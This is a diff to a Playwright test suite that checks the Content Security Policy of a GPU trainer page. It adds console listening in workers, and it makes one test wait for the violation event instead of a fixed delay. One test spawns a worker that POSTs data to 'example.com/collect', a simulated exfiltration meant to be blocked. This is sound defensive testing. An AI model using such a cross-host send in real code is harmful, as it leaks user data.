@@ -164,6 +164,17 @@ test("the GPU trainer loads Splat.js from its pinned address, sending no Referer
       body: SPLAT_JS_STUB,
     });
   });
+  // The browser reports a refusal in the console of whichever context made
+  // the request, and a worker's console is its own: both are listened to,
+  // since the document's event below cannot see the workers.
+  /** @type {string[]} */
+  const cspConsole = [];
+  /** @param {import("@playwright/test").ConsoleMessage} m */
+  const noteCsp = (m) => {
+    if (/Content Security Policy/.test(m.text())) cspConsole.push(m.text());
+  };
+  page.on("console", noteCsp);
+  page.on("worker", (w) => w.on("console", noteCsp));
   await page.addInitScript(() => {
     /** @type {any} */ (window).__cspViolations = [];
     document.addEventListener("securitypolicyviolation", (e) =>
@@ -207,10 +218,12 @@ test("the GPU trainer loads Splat.js from its pinned address, sending no Referer
     expect(headers["referer"]).toBeUndefined();
   }
   expect(seen.refused).toEqual([]);
-  // The page's policy let everything the trainer needs through.
+  // The policy refused nothing this stand-in run asked for, in the page or
+  // in a worker; the real library's own requests are the acceptance run's.
   expect(
     await page.evaluate(() => /** @type {any} */ (window).__cspViolations),
   ).toEqual([]);
+  expect(cspConsole).toEqual([]);
 });
 
 // Why: the trainer runs code from another host in a worker. The page's
@@ -225,12 +238,17 @@ test("a worker on the trainer page cannot fetch from another host", async ({
   await page.goto("/splat/");
   const r = await page.evaluate(async () => {
     const source = `
-      const violations = [];
-      self.addEventListener("securitypolicyviolation", (e) =>
-        violations.push(e.effectiveDirective));
+      const violated = new Promise((resolve) =>
+        self.addEventListener(
+          "securitypolicyviolation",
+          (e) => resolve(e.effectiveDirective),
+          { once: true },
+        ));
       fetch("https://example.com/collect", { method: "POST", body: "x" }).then(
-        () => postMessage({ fetched: true, violations }),
-        () => setTimeout(() => postMessage({ fetched: false, violations }), 50),
+        () => postMessage({ fetched: true, violations: [] }),
+        // The refusal's event may come after the rejection: wait for it
+        // rather than for a guessed delay.
+        async () => postMessage({ fetched: false, violations: [await violated] }),
       );
     `;
     const url = URL.createObjectURL(
